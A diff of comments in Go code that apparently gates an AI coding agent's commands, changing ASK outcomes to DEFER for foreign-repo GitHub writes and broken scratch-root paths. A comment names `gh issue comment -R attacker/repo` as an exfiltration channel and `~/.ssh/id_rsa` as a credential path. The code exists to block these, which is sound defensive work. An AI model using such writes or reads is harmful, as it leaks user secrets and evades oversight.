@@ -37,8 +37,8 @@ type repoContext struct {
 
 // resolveRepoContext shells out to `git rev-parse` against the event's cwd
 // (§8). On ANY subprocess trouble (non-zero exit, empty output, timeout) it
-// returns an error; the caller treats that as fail-closed (block/ask, never
-// allow).
+// returns an error; the caller treats that as fail-closed (block, or a defer
+// carrying the resolution failure as its analysis — never allow).
 func resolveRepoContext(eventCWD string) (*repoContext, error) {
 	if eventCWD == "" {
 		return nil, fmt.Errorf("event has no cwd; cannot resolve git context (fail-closed)")
@@ -141,10 +141,10 @@ func isAppManagedRepo(eventCWD string) bool {
 // git failure, unparseable URL). It is used by the foreign-target write
 // scoping: an otherwise-ALLOWed gh write aimed at a repo OTHER than this one is
 // an exfil-by-write channel (`gh issue comment -R attacker/repo …`) the egress
-// proxy cannot see, so it ASKs.
+// proxy cannot see, so it DEFERS with the target named.
 //
-// A "" result deliberately makes the scoping fail OPEN (the write is not scoped
-// to ASK): the scoping is a refinement on top of an already-ALLOWed own-repo
+// A "" result deliberately makes the scoping fail OPEN (the write keeps its
+// ALLOW): the scoping is a refinement on top of an already-ALLOWed own-repo
 // write, and a git failure here is the same "git cannot answer" case
 // isAppManagedRepo already treats as non-blocking. The write still had to pass
 // the enumerated-recoverable-verb allowlist to reach the scoping check, so the
@@ -268,7 +268,8 @@ func canonicalizeFrom(p string, base string) string {
 // directory. In that case real is still populated (best-effort, p with `~`
 // left as a literal segment) for callers that only want a display string,
 // but the caller MUST NOT treat real as eligible for a `contained` verdict:
-// an unresolvable `~` must fail closed (deny/ask), mirroring applyCd's own
+// an unresolvable `~` must fail closed (deny, or a defer that withholds the
+// allow), mirroring applyCd's own
 // posture for `cd ~` when the home directory can't be resolved (engine_a_
 // bash.go: applyCd sets runningCWDInvalid = true rather than guessing). A
 // literal `~/.ssh/id_rsa` segment left unexpanded would otherwise fall
@@ -357,8 +358,8 @@ const (
 	harnessScratchBundled
 	// harnessScratchBadRoot: the target resolves through a <system-tmp>/
 	// claude-<uid> root that is not a plain directory owned by this uid (it is
-	// a symlink, a non-directory, or another user's) → ASK, with a reason that
-	// names the defect so the failure is not mistaken for the containment bug
+	// a symlink, a non-directory, or another user's) → DEFER, with an analysis
+	// naming the defect so the failure is not mistaken for the containment bug
 	// reappearing.
 	harnessScratchBadRoot
 )
@@ -476,7 +477,7 @@ type harnessScratchRootState struct {
 	root string
 	// defect is "" when the root is a plain directory owned by this uid. A
 	// non-empty defect names what is wrong ("a symlink", …) and turns every
-	// target under root into harnessScratchBadRoot → ASK.
+	// target under root into harnessScratchBadRoot → DEFER.
 	defect string
 }
 
@@ -512,14 +513,15 @@ var harnessScratchRootResolver = resolveHarnessScratchRoot
 // symlink.
 //
 // When the root IS a symlink, the comparison root becomes its DESTINATION.
-// That is required for the ASK to fire at all: the target side is fully
+// That is required for the bad-root DEFER to fire at all: the target side is fully
 // canonicalized, so it lands on the destination, and comparing against the
 // un-followed root would miss it entirely — the path would fall through to the
 // ordinary /tmp deny and hide the actual cause. The cost is that unrelated
-// paths under that destination also become ASK instead of DENY while the root
-// is broken. That is a deliberate trade: an ASK never allows, and a machine
-// whose scratchpad root is a symlink is misconfigured, so a loud diagnosable
-// prompt beats a deny message that reads like this bug reappearing.
+// paths under that destination also become that DEFER instead of a DENY while
+// the root is broken. That is a deliberate trade: the defer never allows, and a
+// machine whose scratchpad root is a symlink is misconfigured, so a logged
+// analysis naming the defect beats a deny message that reads like this bug
+// reappearing.
 func resolveHarnessScratchRoot() harnessScratchRootState {
 	return resolveScratchRootAt(harnessScratchDisplay())
 }
@@ -650,7 +652,7 @@ func testContainmentFrom(target string, base string, rc *repoContext) (containme
 	//	  file-tool, path-reader and write tracks and the curated read-utility
 	//	  track's ordinary ALLOW)
 	//	the claude-<uid> root is not a plain,
-	//	  this-uid-owned directory              → harnessScratchBadRoot (ASK)
+	//	  this-uid-owned directory              → harnessScratchBadRoot (DEFER)
 	//	anything else under /tmp                → escapeRepo            (DENY)
 	//
 	// ALLOW rather than DEFER for the session shape is deliberate: writing to
